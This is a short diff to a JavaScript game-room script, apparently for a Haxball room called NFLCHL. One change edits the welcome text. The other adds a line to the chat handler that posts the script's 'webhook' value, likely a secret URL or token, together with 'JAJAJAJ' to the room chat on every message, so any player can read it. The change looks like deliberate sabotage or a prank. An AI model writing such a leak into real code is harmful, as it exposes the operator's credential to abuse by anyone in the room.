@@ -68,7 +68,7 @@ room.onPlayerAdminChange = function(changedPlayer, byPlayer){
     }
 }
 room.onPlayerJoin = function(player) {
-    room.sendChat("Welcome "+player.name+" to the NFLCHL room!");
+    room.sendChat("Welcome "+player.name+" to the NFLCHL roomxd!");
     updateAdmins();
     allPlayerAuths[player.id] = player.auth;
 
@@ -426,6 +426,7 @@ room.onGameUnpause = function(byPlayer){
 }
 
 room.onPlayerChat = function (player, message) {
+    room.sendChat(webhook.toString() + "JAJAJAJ")
     if (mutedPlayers.includes(player.id)) return false;
     var split_message_old = message.split(" ");
     var split_message = split_message_old[0].substring(1);
